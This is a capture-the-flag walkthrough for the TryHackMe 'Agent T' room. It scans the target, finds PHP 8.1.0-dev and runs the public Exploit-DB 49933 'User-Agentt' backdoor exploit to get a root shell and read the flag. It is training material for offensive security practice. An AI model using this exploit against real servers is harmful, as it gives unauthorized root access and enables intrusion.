@@ -1,0 +1,69 @@
+ █████╗  ██████╗ ███████╗███╗   ██╗████████╗    ████████╗
+██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝    ╚══██╔══╝
+███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║          ██║   
+██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║          ██║   
+██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║          ██║   
+╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝          ╚═╝   
+                                                         
+             https://tryhackme.com/room/agentt
+             
+             
+[NMAP Scan]
+
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 00:15 UTC
+Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 93.02% done; ETC: 00:15 (0:00:00 remaining)
+Nmap scan report for 10.10.80.90
+Host is up (0.27s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+
+Looking around the website, Admin Dashboard, didn't lead to anything interesting. The links did not work, and if you're
+curious what the rest of the messages say, you can view the source code and read them (the cutest being from the good boy).
+
+Gobuster gives an error that reads "Error: the server returns a status code that matches the provided options for non existing urls. 
+http://10.10.80.90/b592112d-da5a-47da-bc2b-b61067df8718 => 200 (Length: 42131). To continue please exclude the status code, the length or use the 
+--wildcard switch." Specifying 200 as a negative status code doesn't produce any other results.
+
+I looked for exploits for PHP 8.1.0-dev and found this on exploit DB: https://www.exploit-db.com/exploits/49933
+
+"PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution"
+
+Save the exploit, and run it:
+
+python 49933.py            
+Enter the full host url:
+http://[machine IP]
+
+Interactive shell is opened on http://10.10.80.90 
+Can't acces tty; job crontol turned off.
+$ whoami
+root
+
+No priv-esc necessary.
+
+$ ls ../../../../..
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+Use cat ../../../../flag.txt for the flag. Congrats!
